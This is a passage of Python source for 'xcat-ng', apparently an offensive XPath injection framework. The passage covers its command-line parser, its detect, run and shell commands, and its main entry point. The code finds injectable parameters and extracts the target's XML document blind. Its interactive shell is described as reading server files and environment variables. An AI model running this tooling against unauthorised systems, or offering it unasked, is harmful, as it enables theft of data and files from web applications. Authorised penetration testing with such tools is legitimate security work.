        getattr(args, "false_code",   None),
    ]):
        sys.exit(
            "[-] Specify at least one oracle flag:\n"
            "    --true-string TEXT  --true-code CODE\n"
            "    --false-string TEXT --false-code CODE"
        )

    target = getattr(args, "target_param", None)
    if not target:
        target = next(iter(req.all_params), None) or ""
        if target:
            warn(f"No --param specified, auto-selected: {target!r}")

    tamper_fn = None
    if getattr(args, "tamper", None):
        spec = importlib.util.spec_from_file_location("tamper", args.tamper)
        mod  = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        tamper_fn = getattr(mod, "tamper", None)

    ctx = AttackContext(
        req=req,
        target_param=target,
        match_fn=build_match_fn(args),
        concurrency=args.concurrency,
        fast_mode=getattr(args, "fast", False),
        timeout=args.timeout,
        proxy=getattr(args, "proxy", None),
        tamper_fn=tamper_fn,
    )

    for feat in (getattr(args, "enable", None) or []):
        ctx.features[feat] = True
    for feat in (getattr(args, "disable", None) or []):
        ctx.features[feat] = False

    return ctx


async def _setup_and_detect(
    ctx: AttackContext, engine: Engine
) -> Optional[Tuple[ExtractionMethod, Injector, Any]]:
    """Build baseline, find injection, detect features. Returns (method, inj, extra)."""
    info("Building response baseline...")
    baseline = await _build_baseline(engine)

    info("Probing for injection points...")
    result = await auto_discover(engine, baseline)

    if not result:
        err("No injection found in any parameter.")
        warn("Troubleshooting tips:")
        warn("  Verify that --true-string is present in a normal response")
        warn("  Use ! prefix to negate: --true-string='!No results'")
        warn("  Try --true-code=200 or --false-code=404")
        warn("  Use -v for verbose debug output")
        return None

    param, method, inj, extra = result
    ctx.target_param = param
    ctx.injector     = inj

    ok(
        f"Injection found  "
        f"param={_c(param, T.CYAN)}  "
        f"method={_c(method.value, T.YELLOW)}  "
        f"injector={_c(inj.name, T.YELLOW)}"
    )
    print(f"  Example : {inj.example}")
    if method == ExtractionMethod.TIME:
        ok(f"Time threshold: {extra:.3f}s")
    print()

    info("Detecting server features...")
    feats = await detect_features(engine)
    ctx.features.update(feats)
    print()

    return method, inj, extra


# ══════════════════════════════════════════════════════════════════════════════
# Command implementations
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_detect(args: argparse.Namespace):
    ctx    = build_context(args)
    engine = Engine(ctx)
    await ctx.start()
    try:
        await _setup_and_detect(ctx, engine)
    finally:
        await ctx.close()


async def cmd_run(args: argparse.Namespace):
    ctx    = build_context(args)
    engine = Engine(ctx)
    await ctx.start()
    try:
        result = await _setup_and_detect(ctx, engine)
        if not result:
            sys.exit(1)

        method, inj, extra = result
        threshold = extra if method == ExtractionMethod.TIME else 0.0

        # If Normal mode leaked something, show it and then also do boolean BFS
        if method == ExtractionMethod.NORMAL and extra:
            ok("Normal extraction result:")
            print(_c(extra, T.GREEN))
            print()
            info("Switching to boolean mode for full XML tree extraction...")
            method    = ExtractionMethod.BOOLEAN
            threshold = 0.0

        info("Extracting XML document  (live output below, progress on stderr)...")
        print()
        print(_c("─" * 64, T.GRAY))

        xml_lines: List[str] = []
        try:
            await exfiltrate_node(
                engine, "/*", depth=0,
                max_depth=getattr(args, "max_depth", 12),
                max_children=getattr(args, "max_children", 40),
                xml_lines=xml_lines,
                method=method, threshold=threshold,
                fast=ctx.fast_mode,
            )
        except KeyboardInterrupt:
            warn("Interrupted — partial result below")

        # Final clean summary
        print()
        print(_c("═" * 64, T.BOLD))
        print(_c("  EXTRACTED XML", T.BOLD))
        print(_c("═" * 64, T.BOLD))
        for ln in xml_lines:
            s = ln.strip()
            print(_c(ln, T.CYAN) if s.startswith("<") else _c(ln, T.GREEN))
        print(_c("═" * 64, T.BOLD))

        if getattr(args, "output", None):
            Path(args.output).write_text("\n".join(xml_lines))
            ok(f"Saved → {args.output}")
    finally:
        await ctx.close()


async def cmd_shell(args: argparse.Namespace):
    ctx    = build_context(args)
    engine = Engine(ctx)
    await ctx.start()
    try:
        result = await _setup_and_detect(ctx, engine)
        if not result:
            sys.exit(1)
        method, _, extra = result
        threshold = extra if method == ExtractionMethod.TIME else 0.0
        await shell_loop(engine, method, threshold)
    finally:
        await ctx.close()


def cmd_injections(_args: argparse.Namespace):
    print(_c("Supported injection templates:\n", T.BOLD))
    for i, inj in enumerate(INJECTORS, 1):
        fp = inj.false_pre or inj.pre
        fs = inj.false_suf or inj.suf
        print(f"  {_c(str(i), T.CYAN)}. {inj.name}")
        print(f"     Example  : {_c(inj.example, T.GRAY)}")
        print(f"     TRUE     : {_c(inj.pre, T.GREEN)}{{condition}}{_c(inj.suf, T.GREEN)}")
        print(f"     FALSE    : {_c(fp, T.RED)}1=2{_c(fs, T.RED)}")
        print()


# ══════════════════════════════════════════════════════════════════════════════
# Argument parser
# ══════════════════════════════════════════════════════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    root = argparse.ArgumentParser(
        prog="xcat-ng",
        description=(
            "xcat-ng  --  Modern XPath Injection Framework (next-generation)\n\n"
            "Commands:\n"
            "  detect      Probe parameters, identify injection type and server features\n"
            "  run         Extract the full XML document\n"
            "  shell       Interactive XPath shell\n"
            "  injections  List injection templates\n\n"
            "Use: xcat-ng <command> --help  for per-command details."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    root.add_argument("-v", "--verbose", action="store_true",
                      help="Enable verbose/debug output")
    root.add_argument("--version", action="version", version="xcat-ng")

    sub = root.add_subparsers(dest="command", required=True)

    # ── detect ──────────────────────────────────────────────────────────────
    p_detect = sub.add_parser(
        "detect",
        help="Probe all parameters, identify injection type and server features",
        description="""
DETECT — identify the injection point and server capabilities
=============================================================
Probes every parameter in the request using all injection templates.
Prints the detected injection type and all server XPath features.
Does NOT extract data. Use 'run' or 'shell' for extraction.

Detection order per parameter:
  1. Normal  — true payload returns richer content than baseline (fastest)
  2. Boolean — true vs false responses differ measurably (reliable)
  3. Time    — true payload causes significant delay (last resort)

Examples:
  xcat-ng detect -r burp.txt --true-string "Welcome"
  xcat-ng detect -r burp.txt --true-string "!Error" -v
  xcat-ng detect --url http://host/page --param q --param-values q=test \\
                 --true-string "found"
  xcat-ng detect -r burp.txt --true-code 200 --false-code 404
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # ── run ─────────────────────────────────────────────────────────────────
    p_run = sub.add_parser(
        "run",
        help="Auto-detect injection, then extract the full XML document",
        description="""
RUN — extract the full XML document from the target
====================================================
Detects the injection point and features, then extracts the entire XML
document using the best available method.

Live output: XML tags are printed immediately as they are found.
A clean summary is printed at the end.

Extraction methods tried in order:
  1. Normal  — data read directly from response body (fastest, no oracle)
  2. Boolean — blind char-by-char with binary search  (reliable)
  3. Time    — timing-based blind extraction           (slow, last resort)

Character search strategies (auto-selected by features):
  codepoint-search  → O(log N) binary search via string-to-codepoints
  substring-search  → O(log N) binary search via substring-before
  fallback          → O(N) frequency-ordered linear scan

Examples:
  xcat-ng run -r burp.txt --true-string "Welcome"
  xcat-ng run -r burp.txt --true-string "!Error" --fast -c 20
  xcat-ng run -r burp.txt --true-code 200 -o result.xml --max-depth 5
  xcat-ng run --url http://host/login --param user --param-values user=admin \\
              --true-string "logged in" -m POST --body-param pass=x
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p_run.add_argument("-o", "--output", metavar="FILE",
                       help="Save extracted XML to this file")
    p_run.add_argument("--max-depth", type=int, default=12, metavar="N",
                       help="Maximum XML tree depth to traverse (default: 12)")
    p_run.add_argument("--max-children", type=int, default=40, metavar="N",
                       help="Maximum children per element (default: 40)")

    # ── shell ────────────────────────────────────────────────────────────────
    p_shell = sub.add_parser(
        "shell",
        help="Auto-detect injection, then open an interactive XPath shell",
        description="""
SHELL — interactive XPath extraction shell
==========================================
Detects the injection point and features, then opens an interactive prompt
where you can run arbitrary XPath expressions against the target.

Shell commands:
  get  <xpath>      Extract string value of any XPath expression
  count <xpath>     Count nodes matching an XPath expression
  xml  [xpath]      Dump XML subtree (default: /*)
  env  [name]       List env vars or get a specific one by name
  file <path>       Read a file (uses unparsed-text() or doc())
  pwd               Print working directory (base-uri / document-uri)
  time              Print server date/time
  find <name>       Search for a file by traversing parent directories
  features          List all detected feature flags with on/off status
  toggle <feature>  Manually toggle a feature flag
  help              Show all shell commands
  exit              Exit the shell

Examples:
  xcat-ng shell -r burp.txt --true-string "Welcome"
  xcat-ng shell --url http://host/api --param token --param-values token=abc \\
                --true-code 200 --false-code 403
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    # ── injections ───────────────────────────────────────────────────────────
    sub.add_parser(
        "injections",
        help="List all supported injection templates with true/false payload examples",
    )

    # ── Shared arguments ─────────────────────────────────────────────────────
    def add_common(p: argparse.ArgumentParser):
        src = p.add_argument_group(
            "Request source  (choose one)"
        )
        me = src.add_mutually_exclusive_group()
        me.add_argument(
            "-r", "--request", metavar="FILE",
            help="Burp Suite raw HTTP request file  (all params parsed automatically)",
        )
        me.add_argument(
            "--url", metavar="URL",
            help="Target URL  (pair with --param and --param-values)",
        )

        pg = p.add_argument_group("Parameters  (used with --url)")
        pg.add_argument(
            "--param", dest="target_param", metavar="NAME",
            help="Name of the parameter to inject into",
        )
        pg.add_argument(
            "--param-values", nargs="*", metavar="KEY=VALUE",
            help="All query/URL parameters, e.g.  q=hello page=1",
        )
        pg.add_argument(
            "--body-param", nargs="*", metavar="KEY=VALUE",
            help="POST body parameters (used with -m POST)",
        )
        pg.add_argument(
            "-m", "--method", default="GET", metavar="METHOD",
            help="HTTP method: GET POST PUT … (default: GET)",
        )
        pg.add_argument(
            "--header", nargs="*", metavar="'Name: value'",
            help="Additional request headers",
        )

        og = p.add_argument_group(
            "Oracle  (at least one required)",
        )
        og.add_argument(
            "--true-string", metavar="TEXT",
            help=(
                "String that is present in a TRUE response body. "
                "Prefix with ! to negate (true when string is absent)."
            ),
        )
        og.add_argument(
            "--true-code", metavar="CODE",
            help=(
                "HTTP status code for a TRUE response. "
                "Prefix with ! to negate, e.g. !404"
            ),
        )
        og.add_argument(
            "--false-string", metavar="TEXT",
            help="String indicating a FALSE response (complementary oracle).",
        )
        og.add_argument(
            "--false-code", metavar="CODE",
            help="HTTP status code for a FALSE response.",
        )

        xo = p.add_argument_group("Options")
        xo.add_argument(
            "-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY, metavar="N",
            help=f"Concurrent requests (default: {DEFAULT_CONCURRENCY})",
        )
        xo.add_argument(
            "--fast", action="store_true",
            help=f"Cap extracted strings at {FAST_MODE_LEN} chars for speed",
        )
        xo.add_argument(
            "--timeout", type=int, default=DEFAULT_TIMEOUT, metavar="SEC",
            help=f"Per-request timeout in seconds (default: {DEFAULT_TIMEOUT})",
        )
        xo.add_argument(
            "--proxy", metavar="URL",
            help="HTTP proxy, e.g. http://127.0.0.1:8080",
        )
        xo.add_argument(
            "--tamper", metavar="FILE",
            help="Python script to tamper requests (must export tamper(ctx, kwargs))",
        )
        xo.add_argument(
            "--enable", nargs="*", metavar="FEATURE",
            help="Force-enable a feature, bypassing auto-detection",
        )
        xo.add_argument(
            "--disable", nargs="*", metavar="FEATURE",
            help="Force-disable a feature",
        )

    for p in (p_detect, p_run, p_shell):
        add_common(p)

    return root


# ══════════════════════════════════════════════════════════════════════════════
# Entry point
# ══════════════════════════════════════════════════════════════════════════════

def main():
    global _verbose

    print(BANNER)
    parser = build_parser()
    args   = parser.parse_args()
    _verbose = getattr(args, "verbose", False)

    dispatch = {
        "detect":     cmd_detect,
        "run":        cmd_run,
        "shell":      cmd_shell,
        "injections": cmd_injections,
    }

    fn = dispatch[args.command]
    if args.command == "injections":
        fn(args)
    else:
        try:
            asyncio.run(fn(args))
        except KeyboardInterrupt:
            warn("Interrupted.")


if __name__ == "__main__":
    main()
